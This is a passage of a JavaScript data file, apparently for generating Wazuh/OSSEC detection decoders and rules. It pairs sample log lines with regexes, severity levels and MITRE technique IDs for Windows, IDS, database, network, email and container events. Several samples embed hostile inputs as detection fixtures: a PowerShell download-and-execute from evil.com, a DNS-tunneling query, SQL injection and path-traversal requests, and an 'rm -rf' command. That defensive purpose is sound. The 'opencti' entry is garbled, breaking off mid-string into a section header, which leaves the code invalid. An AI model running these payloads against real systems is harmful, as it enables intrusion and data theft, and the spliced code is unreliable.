    prog: "gcp",
    fmt: "json",
    ex: '{"timestamp":"2026-06-29T10:23:11Z","protoPayload":{"methodName":"google.iam.admin.v1.CreateRole","principalEmail":"admin@project.iam.gserviceaccount.com"},"resource":{"type":"project"},"severity":"NOTICE"}',
    dc: {
      n: "gcp-audit",
      p: "json",
      ty: "json",
      pm: "CreateRole|SetIamPolicy|DeleteRole",
    },
    rl: { lv: 10, gr: "gcp,cloud,audit", ds: "GCP IAM change" },
    mi: ["T1098"],
    th: "Any IAM change",
  },

  // === WINDOWS ===
  {
    id: "win_4625",
    cat: "win",
    name: "Windows 4625 Failed Logon",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Security EventID=4625 AccountName=admin TargetDomain=WORKGROUP IpAddress=192.168.1.100 LogonType=3",
    dc: {
      n: "windows-4625",
      p: "windows-event",
      pm: "EventID=4625",
      rx: "AccountName=(\\S+) TargetDomain=(\\S+) IpAddress=(\\S+) LogonType=(\\d+)",
      o: "user, domain, srcip, logon_type",
    },
    rl: {
      is: "60122",
      lv: 10,
      gr: "authentication_failed,win",
      mt: "4625",
      ds: "Windows failed logon",
    },
    mi: ["T1110"],
    th: "10x / 300s",
  },
  {
    id: "win_4624",
    cat: "win",
    name: "Windows 4624 Successful Logon",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Security EventID=4624 AccountName=admin TargetDomain=WORKGROUP IpAddress=192.168.1.100 LogonType=2",
    dc: {
      n: "windows-4624",
      p: "windows-event",
      pm: "EventID=4624",
      rx: "AccountName=(\\S+) TargetDomain=(\\S+) IpAddress=(\\S+) LogonType=(\\d+)",
      o: "user, domain, srcip, logon_type",
    },
    rl: {
      is: "60111",
      lv: 3,
      gr: "authentication_success,win",
      mt: "4624",
      ds: "Windows logon success",
    },
    mi: ["T1078"],
    th: "Monitor",
  },
  {
    id: "win_4688",
    cat: "win",
    name: "Windows 4688 Process Create",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Security EventID=4688 AccountName=admin ProcessName=C:\\Users\\admin\\malware.exe CommandLine=malware.exe -payload",
    dc: {
      n: "windows-4688",
      p: "windows-event",
      pm: "EventID=4688",
      rx: "AccountName=(\\S+) ProcessName=(\\S+)",
      o: "user, process",
    },
    rl: {
      is: "60150",
      lv: 7,
      gr: "win,execution",
      mt: "4688",
      ds: "Windows process created",
    },
    mi: ["T1059"],
    th: "Monitor",
  },
  {
    id: "win_7045",
    cat: "win",
    name: "Windows 7045 Service Install",
    prog: "windows",
    fmt: "win",
    ex: "LogName=System EventID=7045 ServiceName=EvilService ImagePath=C:\\Users\\admin\\malware.exe StartType=auto",
    dc: {
      n: "windows-7045",
      p: "windows-event",
      pm: "EventID=7045",
      rx: "ServiceName=(\\S+) ImagePath=(\\S+) StartType=(\\S+)",
      o: "service_name, image_path, start_type",
    },
    rl: {
      is: "60171",
      lv: 10,
      gr: "win,persistence",
      mt: "7045",
      ds: "Windows service installed",
    },
    mi: ["T1543.003"],
    th: "Any non-admin",
  },
  {
    id: "win_4732",
    cat: "win",
    name: "Windows 4732 Security Group",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Security EventID=4732 AccountName=admin TargetUserName=john GroupName=Administrators",
    dc: {
      n: "windows-4732",
      p: "windows-event",
      pm: "EventID=4732",
      rx: "AccountName=(\\S+) TargetUserName=(\\S+) GroupName=(\\S+)",
      o: "member, target_user, group_name",
    },
    rl: {
      is: "60161",
      lv: 10,
      gr: "win,priv_escalation",
      mt: "4732",
      ds: "User added to security group",
    },
    mi: ["T1098"],
    th: "Any Admin",
  },
  {
    id: "win_4698",
    cat: "win",
    name: "Windows 4698 Scheduled Task",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Security EventID=4698 AccountName=admin TaskName=MaliciousTask",
    dc: {
      n: "windows-4698",
      p: "windows-event",
      pm: "EventID=4698",
      rx: "AccountName=(\\S+) TaskName=(\\S+)",
      o: "user, task_name",
    },
    rl: {
      is: "60180",
      lv: 8,
      gr: "win,persistence",
      mt: "4698",
      ds: "Scheduled task created",
    },
    mi: ["T1053"],
    th: "Monitor task",
  },
  {
    id: "win_4104",
    cat: "win",
    name: "PowerShell 4104 ScriptBlock",
    prog: "windows",
    fmt: "win",
    ex: 'LogName=Microsoft-Windows-PowerShell/Operational EventID=4104 ScriptBlockText=Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")',
    dc: {
      n: "powershell-4104",
      p: "windows-event",
      pm: "EventID=4104",
      rx: "ScriptBlockText=(.+?)$",
      o: "script_text",
    },
    rl: {
      is: "61650",
      lv: 10,
      gr: "win,powershell",
      mt: "4104",
      ds: "PowerShell script block execution",
    },
    mi: ["T1059.001"],
    th: "Any obfuscated",
  },
  {
    id: "win_4103",
    cat: "win",
    name: "PowerShell 4103 Pipeline",
    prog: "windows",
    fmt: "win",
    ex: 'LogName=Microsoft-Windows-PowerShell/Operational EventID=4103 CommandInvocation=Invoke-Expression Payload=Invoke-Expression "cmd.exe /c whoami"',
    dc: {
      n: "powershell-4103",
      p: "windows-event",
      pm: "EventID=4103",
      rx: "CommandInvocation=(\\S+) Payload=(.*)",
      o: "command, payload",
    },
    rl: {
      is: "61650",
      lv: 8,
      gr: "win,powershell",
      mt: "4103",
      ds: "PowerShell pipeline execution",
    },
    mi: ["T1059.001"],
    th: "Monitor",
  },
  {
    id: "sysmon_1",
    cat: "win",
    name: "Sysmon 1 Process Create",
    prog: "sysmon",
    fmt: "win",
    ex: "EventID=1 Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c whoami User=admin",
    dc: {
      n: "sysmon-1",
      p: "windows-event",
      pm: "EventID=1",
      rx: "Image=(\\S+) CommandLine=(.*?) User=(\\S+)",
      o: "image, command_line, user",
    },
    rl: {
      is: "61603",
      lv: 5,
      gr: "sysmon,execution",
      mt: "EventID=1",
      ds: "Sysmon: process created",
    },
    mi: ["T1059"],
    th: "Monitor",
  },
  {
    id: "sysmon_3",
    cat: "win",
    name: "Sysmon 3 Network Connect",
    prog: "sysmon",
    fmt: "win",
    ex: "EventID=3 Image=malware.exe DestinationIp=185.xxx.xxx.xxx DestinationPort=4444 Protocol=tcp",
    dc: {
      n: "sysmon-3",
      p: "windows-event",
      pm: "EventID=3",
      rx: "Image=(\\S+) DestinationIp=(\\S+) DestinationPort=(\\d+)",
      o: "image, dstip, dstport",
    },
    rl: {
      is: "61605",
      lv: 10,
      gr: "sysmon,network,c2",
      mt: "EventID=3",
      ds: "Sysmon: network connection",
    },
    mi: ["T1071"],
    th: "Connection to bad IP",
  },
  {
    id: "sysmon_11",
    cat: "win",
    name: "Sysmon 11 File Create",
    prog: "sysmon",
    fmt: "win",
    ex: "EventID=11 Image=wscript.exe TargetFilename=C:\\Users\\admin\\AppData\\Roaming\\evil.vbs",
    dc: {
      n: "sysmon-11",
      p: "windows-event",
      pm: "EventID=11",
      rx: "Image=(\\S+) TargetFilename=(\\S+)",
      o: "image, target_file",
    },
    rl: {
      is: "61607",
      lv: 7,
      gr: "sysmon,persistence",
      mt: "EventID=11",
      ds: "Sysmon: file created",
    },
    mi: ["T1105"],
    th: "Scripts in startup",
  },
  {
    id: "win_defender",
    cat: "win",
    name: "Windows Defender Alert",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Microsoft-Windows-Windows Defender/Operational EventID=1116 ThreatName=Troan:Win32/Malicious!ml DetectionUser=admin",
    dc: {
      n: "defender-alert",
      p: "windows-event",
      pm: "EventID=1116",
      rx: "ThreatName=(\\S+) DetectionUser=(\\S+)",
      o: "threat_name, user",
    },
    rl: {
      lv: 12,
      gr: "win,defender,malware",
      mt: "EventID=1116",
      ds: "Defender detected threat",
    },
    mi: ["T1204"],
    th: "Any detection",
  },
  {
    id: "win_applocker",
    cat: "win",
    name: "Windows AppLocker Block",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Microsoft-Windows-AppLocker/EXE and DLL EventID=8004 PolicyName=EXE PolicyRulePath=C:\\Users\\admin\\* PolicyRule=Blocked",
    dc: {
      n: "applocker-block",
      p: "windows-event",
      pm: "EventID=8004",
      rx: "PolicyRule=(\\S+)",
      o: "rule",
    },
    rl: {
      lv: 10,
      gr: "win,applocker",
      mt: "EventID=8004",
      ds: "AppLocker blocked execution",
    },
    mi: ["T1562"],
    th: "Monitor blocked",
  },
  {
    id: "win_task",
    cat: "win",
    name: "Windows Task Created",
    prog: "windows",
    fmt: "win",
    ex: "LogName=Microsoft-Windows-TaskScheduler/Operational EventID=106 TaskName=\\MaliciousTask UserContext=admin",
    dc: {
      n: "task-created",
      p: "windows-event",
      pm: "EventID=106",
      rx: "TaskName=(\\S+) UserContext=(\\S+)",
      o: "task_name, user",
    },
    rl: {
      lv: 7,
      gr: "win,persistence",
      mt: "EventID=106",
      ds: "Task scheduled",
    },
    mi: ["T1053"],
    th: "Monitor",
  },

  // === IDS/IPS ===
  {
    id: "suricata",
    cat: "ids",
    name: "Suricata Alert",
    prog: "suricata",
    fmt: "syslog",
    ex: "06/29/2026-10:23:11.123456  [**] [1:2012345:3] ET MALWARE Payload [**] {TCP} 203.0.113.5:54321 -> 10.0.0.1:80",
    dc: {
      n: "suricata-alert",
      p: "suricata",
      pm: "ET |GPL |SURICATA",
      rx: "\\[(\\d+:\\d+:\\d+)\\] .+ \\{(\\w+)\\} (\\S+):(\\d+) -> (\\S+):(\\d+)",
      o: "sid, protocol, srcip, srcport, dstip, dstport",
    },
    rl: {
      is: "86500",
      lv: 12,
      gr: "ids,alert",
      mt: "ET |GPL |SURICATA",
      ds: "Suricata alert",
    },
    mi: ["T1203"],
    th: "1 event",
  },
  {
    id: "suricata_dns",
    cat: "ids",
    name: "Suricata DNS Alert",
    prog: "suricata",
    fmt: "syslog",
    ex: "06/29/2026-10:23:11.123456  [**] [1:2021234:2] ET DNS Query for Suspicious Domain [**] {UDP} 192.168.1.100:54321 -> 8.8.8.8:53",
    dc: {
      n: "suricata-alert",
      p: "suricata",
      pm: "ET DNS",
      rx: "\\[(\\d+:\\d+:\\d+)\\] .+ \\{(\\w+)\\} (\\S+):(\\d+) -> (\\S+):(\\d+)",
      o: "sid, protocol, srcip, srcport, dstip, dstport",
    },
    rl: {
      is: "86500",
      lv: 10,
      gr: "ids,dns",
      mt: "ET DNS",
      ds: "Suricata DNS alert",
    },
    mi: ["T1071.004"],
    th: "1 event",
  },
  {
    id: "snort",
    cat: "ids",
    name: "Snort Alert",
    prog: "snort",
    fmt: "syslog",
    ex: "06/29/2026-10:23:11.123456  [**] [1:2012345:3] ET MALWARE Payload [**] {TCP} 203.0.113.5:54321 -> 10.0.0.1:80",
    dc: {
      n: "snort-alert",
      p: "snort",
      pm: "[**]",
      rx: "\\[(\\d+:\\d+:\\d+)\\] .+ \\{(\\w+)\\} (\\S+):(\\d+) -> (\\S+):(\\d+)",
      o: "sid, protocol, srcip, srcport, dstip, dstport",
    },
    rl: { is: "20100", lv: 12, gr: "ids,snort", mt: "[**]", ds: "Snort alert" },
    mi: ["T1203"],
    th: "1 event",
  },
  {
    id: "ossec",
    cat: "ids",
    name: "OSSEC Alert",
    prog: "ossec",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server ossec: Rule: 1002 fired (level 7) -> 'Possible port scan' from 192.168.1.100",
    dc: {
      n: "ossec-alert",
      p: "ossec",
      pm: "Rule: \\d+ fired",
      rx: "Rule: (\\d+) fired \\(level (\\d+)\\) -> '(.+)' from (\\S+)",
      o: "rule_id, level, description, srcip",
    },
    rl: {
      is: "1002",
      lv: 7,
      gr: "ids,ossec",
      mt: "Rule: \\d+ fired",
      ds: "OSSEC alert triggered",
    },
    mi: ["T1046"],
    th: "Monitor",
  },
  {
    id: "wazuh_agent",
    cat: "ids",
    name: "Wazuh Agent Disconnected",
    prog: "wazuh",
    fmt: "syslog",
    ex: "2026/06/29 10:23:11 wazuh-agent: INFO: (6009) Disconnected from server (manager:1514/tcp).",
    dc: {
      n: "wazuh-disconnect",
      p: "wazuh",
      pm: "Disconnected",
      rx: "Disconnected from server",
      o: "message",
    },
    rl: {
      lv: 7,
      gr: "wazuh,agent",
      mt: "Disconnected",
      ds: "Wazuh agent disconnected",
    },
    mi: [],
    th: "Monitor",
  },

  // === DATABASE ===
  {
    id: "mysql",
    cat: "db",
    name: "MySQL Access Denied",
    prog: "mysql",
    fmt: "syslog",
    ex: "2026-06-29 10:23:11 12345 [Warning] Access denied for user admin@192.168.1.100 (using password: YES)",
    dc: {
      n: "mysql-error",
      p: "mysql",
      pm: "Access denied",
      rx: "Access denied for user (\\S+)@(\\S+)",
      o: "user, srcip",
    },
    rl: {
      is: "18100",
      lv: 8,
      gr: "database,auth",
      mt: "Access denied",
      ds: "MySQL access denied",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "postgres",
    cat: "db",
    name: "PostgreSQL Auth Fail",
    prog: "postgresql",
    fmt: "syslog",
    ex: '2026-06-29 10:23:11.123 UTC [12345] LOG: password authentication failed for user "admin" from host "192.168.1.100"',
    dc: {
      n: "postgresql-error",
      p: "postgresql",
      pm: "password authentication failed",
      rx: 'password authentication failed for user "(\\S+)"',
      o: "user",
    },
    rl: {
      is: "18200",
      lv: 8,
      gr: "database,auth",
      mt: "password authentication failed",
      ds: "PostgreSQL auth failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "mssql",
    cat: "db",
    name: "MSSQL Login Failure",
    prog: "mssql",
    fmt: "syslog",
    ex: "2026-06-29 10:23:11.123 LOGIN LOGIN FAILED: 18456. Login failed for user 'admin'. Reason: Password did not match. [CLIENT: 192.168.1.100]",
    dc: {
      n: "mssql-login",
      p: "mssql",
      pm: "LOGIN FAILED",
      rx: "Login failed for user '(\\S+)'.*CLIENT: (\\S+)\\]",
      o: "user, srcip",
    },
    rl: {
      lv: 8,
      gr: "database,mssql,auth",
      mt: "LOGIN FAILED",
      ds: "MSSQL login failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "mongodb",
    cat: "db",
    name: "MongoDB Auth Fail",
    prog: "mongodb",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server mongod[1234]: Unauthorized: admin@admin from 192.168.1.100:54321",
    dc: {
      n: "mongodb-auth",
      p: "mongod",
      pm: "Unauthorized",
      rx: "Unauthorized: (\\S+)@(\\S+) from (\\S+)",
      o: "user, db, srcip",
    },
    rl: {
      lv: 8,
      gr: "database,mongodb,auth",
      mt: "Unauthorized",
      ds: "MongoDB unauthorized",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "redis",
    cat: "db",
    name: "Redis Auth Fail",
    prog: "redis",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server redis[1234]: # User admin has no permissions to run the 'CONFIG' command",
    dc: {
      n: "redis-auth",
      p: "redis",
      pm: "no permissions",
      rx: "user (\\S+) has no permissions",
      o: "user",
    },
    rl: {
      lv: 8,
      gr: "database,redis",
      mt: "no permissions",
      ds: "Redis permission denied",
    },
    mi: ["T1552"],
    th: "Monitor",
  },
  {
    id: "elastic",
    cat: "db",
    name: "Elasticsearch Error",
    prog: "elasticsearch",
    fmt: "syslog",
    ex: "[2026-06-29T10:23:11,123][WARN ][o.e.x.s.a.s.ReservedRolesStore] [admin] Failed to authenticate user 'admin'",
    dc: {
      n: "elastic-auth",
      p: "elasticsearch",
      pm: "Failed to authenticate",
      rx: "Failed to authenticate user '(\\S+)'",
      o: "user",
    },
    rl: {
      lv: 8,
      gr: "database,elastic,auth",
      mt: "Failed to authenticate",
      ds: "Elasticsearch auth failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },

  // === NETWORK ===
  {
    id: "zeek_conn",
    cat: "net",
    name: "Zeek Connection",
    prog: "zeek",
    fmt: "json",
    ex: "1750123456.789012\tConn1234\t192.168.10.40\t54321\t192.168.10.10\t22\ttcp\tREJ",
    dc: { n: "zeek-conn", p: "json", ty: "json", pm: "conn_state" },
    rl: { lv: 8, gr: "network,port_scan", ds: "Zeek connection rejected" },
    mi: ["T1046"],
    th: "10x / 60s",
  },
  {
    id: "zeek_dns",
    cat: "net",
    name: "Zeek DNS Query",
    prog: "zeek",
    fmt: "json",
    ex: "1750123457.890123\tDns1234\t192.168.10.40\t54321\t8.8.8.8\t53\tudp\tmalicious-c2.example.com",
    dc: { n: "zeek-dns", p: "json", ty: "json", pm: "query" },
    rl: { lv: 10, gr: "network,dns,c2", ds: "Suspicious DNS query" },
    mi: ["T1071.004"],
    th: "Monitor intel feeds",
  },
  {
    id: "dns_tunnel",
    cat: "net",
    name: "DNS Tunneling",
    prog: "named",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server named[1234]: client 192.168.1.100#54321: query: very-long-subdomain.evil.com IN TXT",
    dc: {
      n: "dns-tunnel",
      p: "named",
      pm: "IN TXT",
      rx: "client (\\S+)#\\d+: query: (\\S+) IN TXT",
      o: "srcip, query",
    },
    rl: {
      lv: 10,
      gr: "dns,tunnel,exfil",
      mt: "IN TXT",
      ds: "DNS TXT — possible tunneling",
    },
    mi: ["T1048", "T1572"],
    th: "Unusual length",
  },
  {
    id: "dhcp",
    cat: "net",
    name: "DHCP Server Alert",
    prog: "dhcpd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server dhcpd[1234]: DHCPDISCOVER from 00:11:22:33:44:55 via eth0: network 10.0.0.0/24 no free leases",
    dc: {
      n: "dhcp-alert",
      p: "dhcpd",
      pm: "no free leases|DHCPREQUEST.*unknown",
      rx: "DHCPDISCOVER from (\\S+) via (\\S+): (.+)",
      o: "mac, interface, message",
    },
    rl: {
      lv: 5,
      gr: "network,dhcp",
      mt: "no free leases",
      ds: "DHCP pool exhausted",
    },
    mi: [],
    th: "Monitor",
  },
  {
    id: "openvpn",
    cat: "net",
    name: "OpenVPN Auth Fail",
    prog: "openvpn",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server openvpn[1234]: 192.168.1.100:54321 VERIFY FAILURE: admin: Authentication failure",
    dc: {
      n: "openvpn-auth",
      p: "openvpn",
      pm: "VERIFY FAILURE",
      rx: "VERIFY FAILURE: (\\S+): (.+)",
      o: "user, reason",
    },
    rl: {
      lv: 8,
      gr: "network,vpn,auth",
      mt: "VERIFY FAILURE|AUTH_FAILED",
      ds: "OpenVPN auth failure",
    },
    mi: ["T1110", "T1078"],
    th: "5x / 60s",
  },
  {
    id: "wireguard",
    cat: "net",
    name: "WireGuard Peer Auth",
    prog: "wireguard",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server kernel: wireguard: wg0: Peer 12345678 (192.168.1.100:54321) allowed IP 10.0.0.2 handshake failed",
    dc: {
      n: "wireguard-auth",
      p: "kernel",
      pm: "wireguard.*handshake failed",
      rx: "wireguard: (\\S+): Peer (\\S+) \\((\\S+):(\\d+)\\)",
      o: "interface, peer, srcip, srcport",
    },
    rl: {
      lv: 5,
      gr: "network,vpn",
      mt: "handshake failed",
      ds: "WireGuard handshake failed",
    },
    mi: [],
    th: "Monitor",
  },

  // === EMAIL ===
  {
    id: "postfix",
    cat: "email",
    name: "Postfix Reject",
    prog: "postfix",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 mail postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[192.168.1.100]: 554 5.7.1 Service unavailable",
    dc: {
      n: "postfix-reject",
      p: "postfix",
      pm: "reject",
      rx: "RCPT from \\S+\\[(\\S+)\\]: (\\d+) (.+)",
      o: "srcip, code, message",
    },
    rl: {
      is: "25030",
      lv: 7,
      gr: "email,spam",
      mt: "reject",
      ds: "Postfix email rejected",
    },
    mi: ["T1566"],
    th: "20x / 60s",
  },
  {
    id: "dovecot",
    cat: "email",
    name: "Dovecot Auth Fail",
    prog: "dovecot",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 mail dovecot[1234]: imap-login: Disconnected (auth failed, 1 attempts): user=<admin>, method=PLAIN, rip=192.168.1.100, lip=10.0.0.1",
    dc: {
      n: "dovecot-auth",
      p: "dovecot",
      pm: "auth failed",
      rx: "user=<(\\S+)>, method=\\w+, rip=(\\S+)",
      o: "user, srcip",
    },
    rl: {
      lv: 8,
      gr: "email,auth",
      mt: "auth failed",
      ds: "Dovecot auth failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "spamassassin",
    cat: "email",
    name: "SpamAssassin Alert",
    prog: "spamassassin",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 mail spamd[1234]: spamd: result: Y 999 - BAYES_999, HTML_MESSAGE, RCVD_IN_BL_SPAMCOP_NET scantime=0.5, size=1234, user=admin, uid=1000, required_score=5.0, rblhost=192.168.1.100",
    dc: {
      n: "spamassassin",
      p: "spamd",
      pm: "result: Y",
      rx: "result: Y .* rblhost=(\\S+)",
      o: "srcip",
    },
    rl: {
      lv: 5,
      gr: "email,spam",
      mt: "result: Y",
      ds: "SpamAssassin marked as spam",
    },
    mi: ["T1566"],
    th: "Monitor",
  },
  {
    id: "mailscanner",
    cat: "email",
    name: "MailScanner Virus",
    prog: "mailscanner",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server MailScanner[1234]: Virus Found: "Trojan.Agent" in email from "attacker@evil.com" to "user@company.com"',
    dc: {
      n: "mailscanner",
      p: "mailscanner",
      pm: "Virus Found",
      rx: '"(.+)" in email from "(.+)" to "(.+)"',
      o: "virus_name, sender, recipient",
    },
    rl: {
      lv: 12,
      gr: "email,malware,virus",
      mt: "Virus Found",
      ds: "MailScanner detected virus",
    },
    mi: ["T1566"],
    th: "Any virus",
  },
  {
    id: "exchange",
    cat: "email",
    name: "MS Exchange Auth Fail",
    prog: "exchange",
    fmt: "syslog",
    ex: "2026-06-29T10:23:11Z,192.168.1.100,admin,mail.contoso.com,Authentication failed,443,OWA",
    dc: {
      n: "exchange-auth",
      p: "exchange",
      pm: "Authentication failed",
      rx: "(\\S+),(\\S+),admin,(\\S+),Authentication failed",
      o: "srcip, user, server",
    },
    rl: {
      lv: 8,
      gr: "email,exchange,auth",
      mt: "Authentication failed",
      ds: "Exchange auth failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },

  // === CONTAINER / ORCHESTRATION ===
  {
    id: "docker",
    cat: "container",
    name: "Docker Container Escape",
    prog: "dockerd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server dockerd[1234]: Container 123abc attempted to mount /sys/fs/cgroup read-write",
    dc: {
      n: "docker-security",
      p: "dockerd",
      pm: "container.*mount|privileged|cap_sys_admin",
      rx: "Container (\\S+) attempted (.+)",
      o: "container_id, action",
    },
    rl: {
      lv: 12,
      gr: "docker,container,security",
      mt: "privileged|cap_sys_admin|/sys/fs/cgroup",
      ds: "Docker — possible container escape",
    },
    mi: ["T1610"],
    th: "Any privileged",
  },
  {
    id: "k8s",
    cat: "container",
    name: "K8s Pod Exec",
    prog: "k8s",
    fmt: "json",
    ex: '{"kind":"Event","verb":"create","user":{"username":"admin"},"objectRef":{"resource":"pods","subresource":"exec"},"sourceIPs":["192.168.1.100"]}',
    dc: { n: "k8s-audit", p: "json", ty: "json", pm: "pod/exec" },
    rl: { lv: 10, gr: "k8s,kubernetes,audit", ds: "K8s pod exec detected" },
    mi: ["T1613"],
    th: "Monitor",
  },
  {
    id: "k8s_config",
    cat: "container",
    name: "K8s ConfigMap Change",
    prog: "k8s",
    fmt: "json",
    ex: '{"kind":"Event","verb":"update","user":{"username":"admin"},"objectRef":{"resource":"configmaps","name":"app-config"},"sourceIPs":["192.168.1.100"]}',
    dc: { n: "k8s-audit", p: "json", ty: "json", pm: "configmaps" },
    rl: { lv: 7, gr: "k8s,kubernetes,audit", ds: "K8s ConfigMap changed" },
    mi: ["T1069"],
    th: "Monitor",
  },

  // === COMMUNITY (bayusky) ===
  {
    id: "opencti",
    cat: "ids",
    name: ALWARE / OTHER ===
  {
    id: "webshell",
    cat: "malware",
    name: "WebShell File Create",
    prog: "auditd",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server auditd[1234]: SYSCALL ... exe="/usr/sbin/httpd" key="webshell_file_create"',
    dc: {
      n: "webshell-file",
      p: "auditd",
      pm: 'key="webshell',
      rx: 'exe="(\\S+)".+key="(.+)"',
      o: "exe, audit_key",
    },
    rl: { lv: 12, gr: "webshell,attack", ds: "Possible web shell file" },
    mi: ["T1505.003"],
    th: "Any webshell",
  },
  {
    id: "misp",
    cat: "other",
    name: "MISP Event Published",
    prog: "misp",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server misp[1234]: Event 1234 published: "Suspicious IP" from org "CERT"',
    dc: {
      n: "misp-event",
      p: "misp",
      pm: "published:",
      rx: 'Event (\\d+) published: "(.+)" from org "(.+)"',
      o: "event_id, description, org",
    },
    rl: {
      is: "100620",
      lv: 13,
      gr: "misp,threat_intel",
      mt: "published:",
      ds: "MISP threat intel event",
    },
    mi: ["T1078"],
    th: "Correlation required",
  },
  {
    id: "cron",
    cat: "other",
    name: "Cron Execution",
    prog: "CRON",
    fmt: "syslog",
    ex: "Jun 29 10:23:01 server CRON[12345]: (admin) CMD (/usr/bin/python3 /home/admin/script.py)",
    dc: {
      n: "cron-exec",
      p: "CRON",
      pm: "CMD",
      rx: "\\((\\S+)\\) CMD \\((.+)\\)",
      o: "user, command",
    },
    rl: {
      is: "51600",
      lv: 3,
      gr: "cron,execution",
      mt: "CMD",
      ds: "Cron job executed",
    },
    mi: [],
    th: "Monitor",
  },
  {
    id: "selinux",
    cat: "other",
    name: "SELinux Denial",
    prog: "setroubleshoot",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server setroubleshoot[1234]: SELinux is preventing /usr/sbin/httpd from 'write' access on the file /var/www/html/test.php.",
    dc: {
      n: "selinux-deny",
      p: "setroubleshoot",
      pm: "SELinux is preventing",
      rx: "SELinux is preventing (.+) from '(\\w+)' access",
      o: "process, access",
    },
    rl: {
      lv: 5,
      gr: "selinux,security",
      mt: "SELinux is preventing",
      ds: "SELinux denied access",
    },
    mi: ["T1562"],
    th: "Monitor",
  },
];

// ==================== ALT EXAMPLES ====================
var ALT_EXAMPLES = {
  ssh_fail: [
    "Jun 29 10:23:11 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
    "Jun 29 10:24:05 server sshd[1235]: Failed password for admin from 10.0.0.50 port 54321 ssh2",
    "Jun 29 10:25:33 server sshd[1236]: Failed password for test from 203.0.113.5 port 22",
  ],
  ssh_inv: [
    "Jun 29 10:23:11 server sshd[1234]: Failed password for invalid user admin from 10.0.0.50 port 22 ssh2",
    "Jun 29 10:24:05 server sshd[1235]: Failed password for invalid user root from 192.168.1.200 port 22",
  ],
  squid: [
    "2025-06-20T07:49:26.179+0000 1 192.168.100.10 TCP_DENIED/403 4321 GET http://evil.com/payload.exe",
    "2025-06-20T08:15:42.123+0000 1 10.0.0.50 TCP_DENIED/407 1234 GET http://malware-site.com/trojan.exe",
    "2025-06-20T09:00:00.000+0000 1 172.16.0.1 TCP_DENIED/403 999 GET https://phishing.com/login",
  ],
  sudo_ok: [
    "Jun 29 11:05:33 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
    "Jun 29 11:06:22 server sudo: john : TTY=pts/1 ; PWD=/var/www ; USER=www-data ; COMMAND=/bin/rm -rf /tmp/cache",
    "Jun 29 11:07:01 server sudo: root : TTY=pts/2 ; PWD=/root ; USER=postgres ; COMMAND=/usr/bin/psql",
  ],
  web_trav: [
    '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /admin/../../../etc/passwd HTTP/1.1" 404 512',
    '10.0.0.100 - - [29/Jun/2026:11:20:33 +0700] "GET /../../../../windows/system32/config/sam HTTP/1.1" 403 256',
    '203.0.113.5 - - [29/Jun/2026:12:00:00 +0700] "GET /cgi-bin/../../../../bin/sh HTTP/1.1" 500 128',
  ],
  web_sqli: [
    '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /search?q=1 UNION SELECT * FROM users-- HTTP/1.1" 200 1234',
    '10.0.0.100 - - [29/Jun/2026:11:20:33 +0700] "GET /login?id=1 OR 1=1-- HTTP/1.1" 200 512',
    '203.0.113.5 - - [29/Jun/2026:12:00:00 +0700] "GET /product?id=1; DROP TABLE orders-- HTTP/1.1" 500 256',
  ],
  iptables: [
    "Jun 29 10:23:11 server kernel: [12345] DROP IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=54321 DPT=22",
    "Jun 29 10:24:05 server kernel: [12346] DROP IN=eth0 SRC=10.0.0.50 DST=192.168.1.1 PROTO=TCP SPT=44321 DPT=3306",
    "Jun 29 10:25:33 server kernel: [12347] DROP IN=eth1 SRC=172.16.0.1 DST=10.0.0.1 PROTO=UDP SPT=53 DPT=5353",
  ],
  fortigate: [
    'date=2026-06-29 time=10:23:11 devname="FGT-100D" logid="0000000013" type="traffic" action="deny" srcip=203.0.113.5 dstip=10.0.0.1 dstport=80',
    'date=2026-06-29 time=11:30:00 devname="FGT-200E" logid="0000000013" type="traffic" action="block" srcip=10.0.0.50 dstip=192.168.1.100 dstport=443',
    'date=2026-06-29 time=12:15:22 devname="FGT-100D" logid="0100032001" type="event" subtype="admin" status="failed" user="admin" srcip=192.168.1.100',
  ],
  win_4625: [
    "LogName=Security EventID=4625 AccountName=admin TargetDomain=WORKGROUP IpAddress=192.168.1.100 LogonType=3",
    "LogName=Security EventID=4625 AccountName=root TargetDomain=DOMAIN IpAddress=10.0.0.50 LogonType=10",
    "LogName=Security EventID=4625 AccountName=svc_backup TargetDomain=WORKGROUP IpAddress=203.0.113.5 LogonType=2",
  ],
  suricata: [
